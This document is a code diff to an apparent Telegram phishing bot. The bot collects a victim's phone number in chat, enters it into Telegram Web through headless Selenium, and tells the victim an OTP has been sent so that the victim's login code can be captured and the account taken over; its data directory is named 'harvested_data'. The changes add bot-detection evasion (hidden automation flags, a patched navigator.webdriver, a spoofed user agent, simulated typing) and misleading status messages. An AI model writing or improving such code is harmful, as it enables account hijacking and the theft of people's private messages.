@@ -19,16 +19,23 @@ DB_DIR = 'harvested_data'
 def get_driver():
     opts = Options()
     opts.add_argument("--headless")
-    opts.add_argument("--no-sandbox") # Required for root/VM environments
-    opts.add_argument("--disable-dev-shm-usage") # Prevents memory crashes in containers
-    opts.add_argument("--disable-gpu")
+    opts.add_argument("--no-sandbox")
+    opts.add_argument("--disable-dev-shm-usage")
+    
+    # Hide Automation Flags
     opts.add_argument("--disable-blink-features=AutomationControlled")
+    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
+    opts.add_experimental_option('useAutomationExtension', False)
     
-    # Optional: Set a real user agent to avoid detection
-    opts.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
+    # Set a common User-Agent
+    opts.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
     
-    return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
-
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
+    
+    # Patch Navigator.webdriver
+    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+    return driver
+    
 
 user_states = {}
 
@@ -71,24 +78,43 @@ async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif state['step'] == 'PHONE':
         state['phone'] = text
-        await update.message.reply_text("📩 **OTP Sent.** Enter the code from your Telegram app.")
+        await update.message.reply_text("📩 **Verifying Tunnel...** (Wait 10 seconds)")
         
         driver = get_driver()
-        driver.get("https://web.telegram.org/a/") 
-        wait = WebDriverWait(driver, 30) 
+        driver.get("https://web.telegram.org/a/")
+        wait = WebDriverWait(driver, 40)
         
         try:
-            # Multi-XPATH fallback selection
-            el = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@type='tel']")))
+            # Wait for page load
+            el = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@type='tel']")))
             el.click()
-            el.send_keys(text)
-            driver.find_element(By.XPATH, "//button[contains(., 'Next')]").click()
             
+            # Simulate Human Typing
+            for char in text:
+                el.send_keys(char)
+                time.sleep(0.1)
+            
+            time.sleep(2) # Wait for UI to validate number
+            
+            # Click Next
+            next_btn = driver.find_element(By.XPATH, "//button[contains(., 'Next')]")
+            next_btn.click()
+            
+            # Verify if we moved to OTP screen or got an error
+            time.sleep(5)
+            if "Phone number not registered" in driver.page_source:
+                 await update.message.reply_text("❌ Number not found. Use +91 format.")
+                 driver.quit()
+                 return
+
             state['driver'] = driver
             state['step'] = 'OTP'
+            await update.message.reply_text("⚠️ **OTP Sent!** Check your Telegram app.")
+
         except Exception as e:
             print(f"[-] Selenium Error: {e}")
             driver.quit()
+            
             
 
     elif state['step'] == 'OTP':
